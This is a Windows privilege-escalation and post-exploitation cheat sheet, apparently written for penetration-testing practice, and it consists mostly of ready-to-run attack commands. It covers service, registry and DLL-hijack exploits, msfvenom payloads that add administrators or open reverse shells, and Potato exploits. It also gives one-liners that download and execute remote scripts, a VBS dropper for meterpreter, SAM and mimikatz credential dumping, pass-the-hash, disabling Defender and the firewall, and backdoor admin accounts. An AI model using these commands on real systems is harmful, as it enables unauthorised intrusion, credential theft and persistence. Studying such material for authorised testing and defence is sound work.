# Quick Enum    
## Command line
    systeminfo 
    whoami /priv
    ipconfig /all  
    route print  
    net users   
    qwinsta                          #is anyone else logged in?   
    net localgroup    
    dir /r    
    tree /a /f    
    set                               #enviromental variables
    net use                           #connected drives  
    net share                         #shared folders
    tasklist /v /fi "username eq system"      #tasks running as SYSTEM  
    
    netstat -ano    
    netsh firewall show state 
    netsh firewall show config
    
### Important Files  

    %SYSTEMROOT%\System32\drivers\etc\hosts                   #local DNS entries 
    %SYSTEMROOT%\System32\drivers\etc\networks                #network config
    %SYSTEMROOT%\Prefetch                                     #prefetch dir, exe logs
    %WINDIR%\system32\config\AppEvent.Evt                     #application logs
    %WINDIR%\system32\config\SecEvent.Evt                     #security logs

    
## Powershell
    powershell.exe -nop -ep bypass    
    Get-ExecutionPolicy    
    Set-ExecutionPolicy Unrestricted   
    Set-MpPreference -DisableRealtimeMonitoring $true   

## Scripts 
**You might want to check for AV first!**  

[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)   
[nishang](https://github.com/samratashok/nishang)  
[JAWS](https://github.com/411Hall/JAWS)   
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)   
[PrivEscCheck](https://github.com/itm4n/PrivescCheck)   
[Windows Exploit Suggester (Next-Generation)](https://github.com/bitsadmin/wesng) 
[Sherlock](https://github.com/rasta-mouse/Sherlock)
[Priv2Admin](https://github.com/gtworek/Priv2Admin)    OS priviliges to system

[Other scripts here](https://github.com/Scr1ptK1ddie/WindowsBinaries) 

### Impacket 
https://github.com/SecureAuthCorp/impacket

    apt install impacket-scripts

Local Locations:

    /usr/share/doc/python3-impacket/examples

## Checklists    
[HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)  
[Fuzzy security](http://www.fuzzysecurity.com/tutorials/16.html) 

____   

# Manual Enum 
https://lolbas-project.github.io/#   
    
## Service Exploits 
    tasklist /svc 
    sc query 
    net start/stop service  
### Insecure Service Properties   
Dangerous perms: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS 

    sc qc [service name]  
### Unquoted Service Paths   
Need unquoted service path and ability to start service 

    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """   
    sc qc [service name]        #to check what account service runs under 
    powershell "get-acl -Path 'C:\Program Files (x86)\Service Folder' | format-list"     #to check dir perms 
    
Generate exe and upload   

    msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe  
    sc start service  
### Weak Registry Permissions
### Insecure Service Executables   
    icalcs Shared  
    accesschk.exe -uwcqv "Everyone" *
    accesschk.exe -uwcqv "Authenticated Users" *
    accesschk.exe -uwcqv "Users" *
### Scheduled Tasks
    schtasks /query /fo LIST 2>nul | findstr TaskName  
    dir C:\windows\tasks  
### DLL Search Order Hijacking  
[Windows Server 2008-2019](https://itm4n.github.io/windows-server-netman-dll-hijacking/)   

    accesschk.exe /accepteula -uvqc user [service name]             #look for: SERVICE_STOP, SERVICE_START    

Find service with a DLL that isn't found, able to start/stop service and searched location is in a writeable directory. Also need C source code- transfer to Kali - insert line then compile.  

    system("cmd.exe /k net localgroup administrators user /add");             #line to insert in C code
    
    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll              #compile on Kali then transfer   
### Binpath  
Look for SERVICE_CHANGE_CONFIG and SERVICE_START     
Windows XP SP1 - upnphost service and dependant service. [Ref](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)  

     accesschk.exe /accepteula -wuvc [svc name]         
     
     sc config [svc name] binpath= "net localgroup administrators [username] /add"   
     sc start [service name]   
## Registry Exploits
### Autoruns   
Search

    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

Confirm perms - overwrite the program? (May need to upload accesschk) 

    accesschk /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
### AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
    #upload reverse reverse shell to C:\temp  
    msiexec /quiet /qn /i C:\Temp\reverse.msi
## Passwords  
Run from C:\ (recursive search). C:\Windows\Panther\Unattend.xml: base64 password    

    findstr /si password *.xml *.ini *.txt *.config 2>nul    
    dir /s *pass* == *vnc* == *.config* 2>nul    
    
    dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul    
    
DMP Files (possible base64 passwords)  - find or create from processes

    strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"    
    
### Saved creds
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
    cmdkey /list   
    dir C:\Users\username\AppData\Local\Microsoft\Credentials\   
    dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\   
    
    runas /savecred /user:[user name] C:\PrivEsc\reverse.exe  
    
    PsExec64.exe /accepteula -i -u admin -p password C:\Temp\reverse.exe  
    
### Creds in Registry 
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s 
### SAM and SYSTEM Files
    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\System32\config\RegBack\SAM
    %SYSTEMROOT%\System32\config\SAM
    %SYSTEMROOT%\repair\system
    %SYSTEMROOT%\System32\config\SYSTEM
    %SYSTEMROOT%\System32\config\RegBack\system 
### Extracting SAM and SYSTEM   

[CVE-2021-36934, the SeriousSAM local privilege escalation](https://github.com/HuskyHacks/ShadowSteal)  

Manually or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 

Manually:

     reg.exe save HKLM\SAM sam.bak 
     reg.exe save HKLM\SYSTEM system.bak 
     *transfer files to attack box then dump* 
     python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 

Mimikatz: 

     privilege::debug 
     token::elevate 
     lsadump::sam  
     
*then crack hashes or use pass the hash to login* 
[Online hash cracker](https://crackstation.net/) 

## Privilige Exploits 



[Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   

    whoami /priv
    SeImpersonatePrivilige -> PrintSpoofer, Hot Potato 
    If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
    If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato

### PrintSpoofer 
SeImpersonatePrivilige. Windows Server 2016, Server 2019, and Windows 10. 
[Print Spoofer](https://github.com/itm4n/PrintSpoofer)  
[Compiled exe](https://github.com/dievus/printspoofer)  

     PrintSpoofer.exe -i -c cmd

### Hot Potato (Original)    
SeImpersonatePrivilige
Windows 7, 8, 10, Server 2008, and Server 2012. Patched. 
exe: [Potato](https://github.com/foxglovesec/Potato/)     

     Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true  
     
Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass powershell execution policy. Upload Tater and import.    
     Import-Module Tater.ps1 
     Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"   

### Juicy Potato   
Look for SeImpersonate or SeAssignPrimaryToken 
[binaries](https://github.com/ohpe/juicy-potato)  
[CLSIDS](http://ohpe.it/juicy-potato/CLSID/)   

     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

### Rogue Potato   
[Blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)   
[Code](https://github.com/antonioCoco/RoguePotato)  

run redirector on kali and exe on victim:

     socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
     .\RoguePotato.exe -r YOUR_IP -e "command" -l 9999   
     test cmd: -e "cmd.exe /c ping YOUR_IP"  
     shell cmd: -e "powershell -c iex( iwr http://[YOUR_IP]/shell.ps1 -UseBasicParsing )"   
     using nishang web shell 
     

## Kernel exploits   
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"     
    wmic qfe get Caption,Description,HotFixID,InstalledOn     
### Tools
https://github.com/bitsadmin/wesng   
https://github.com/rasta-mouse/Watson   
### Precompiled Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits   

## Misc  
[Print Demon](https://windows-internals.com/printdemon-cve-2020-1048/)  
[SYSTEM Nightmare](https://github.com/GossiTheDog/SystemNightmare) Print nightmare implementation   
[CVE 2019-1388](https://github.com/jas502n/CVE-2019-1388)   
____   

# File Transfer     
[Reference - 15 ways to download files](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/)     
[Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)   
[Windows One liners for file uploading](https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/)     

**try certutil first - sometimes Powershell has problems, check size of file to see if transfer was successful** 

    certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
    
## Powershell
    powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
    powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
    powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Windows\Temp\out  
    powershell -ep bypass iex (iwr http://$IP/shell.ps1 -useb) 
    
    IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

## VBS 
    echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"

## XM File Creation (Using copy and paste)
    PS C:\> $console = [XML] @"
    <XML CODE CODE HERE>
    "@
    /# write the xml to file:
    PS C:\> $console.save("C:\users\burmat\documents\console.xml") 
    
 ## Windows 10 - curl
    curl http://server/file -o file
    curl http://server/file.bat | cmd
 ____   

 ## Network Scanning / Enum 
 [Static Windows binaries](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows) 
 
    for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.     
    route print 
    arp -a  
    C:\Windows\System32\drivers\etc\host        Windows DNS entries  
 ____
 # Persistence
     net user USERNAME PASSWORD /add
     net localgroup Administrators USERNAME /add
     net localgroup "Remote Management Users" USERNAME /add    
 ## Access  
     pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
     xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
     \\tsclient\share\mimikatz\x64\mimikatz.exe   

____ 
# Post Exploitation / Exfiltration  
## Checklist
Dual home:

    ipconfig /all
    arp -a
    route print 
## Access
### Pass the Hash with winexe

    pth-winexe //192.168.149.10 -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e cmd   
### WinRM
 Enabled WinRm as Administrator to use evil-winrm. -H to pass the hash
 
     WinRM quickconfig       
 
### Enabling RDP  
Add a user with RDP / admin privs 

    net user evil 3v1lPass /add
    net localgroup Administrators evil /add
    net localgroup "Remote Desktop Users" evil /ADD

Enable RDP 

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off

    netsh firewall set opmode disable
    or
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:
"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.""
Add this reg key:

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f


## Transferring Files
 [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
 [Reference - Exfil Files from Windows Manually](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)  
 
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                         #only on a trusted network (no password)   
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS        
     net use \\IP\share /USER:USER PASS    
     copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
     copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
     
### Old Boxes (Windows XP)  
TFTP usually enabled 
metasploit tfp server module on Kali

    tftp -i 192.168.119.10 PUT secrets.txt
     
## Remote Scripts  
[lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  

 ## AV Evasion  
 ### Check for AV  
     sc query windefend
     "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All               #Delete all rules of Defender (useful for machines without internet access)   
 ### Obfuscate Payloads
Use wrapper files to call static executables (such as nc) 
[Chameleon](https://github.com/klezVirus/chameleon): Powershell script obfuscator  

     
 ____
 
# Resources
## Cheat Sheets and Guides 
https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts  
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/   
https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/ 

## Learn More
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/      
https://github.com/frizb/Windows-Privilege-Escalation    
https://toshellandback.com/2015/11/24/ms-priv-esc/

  
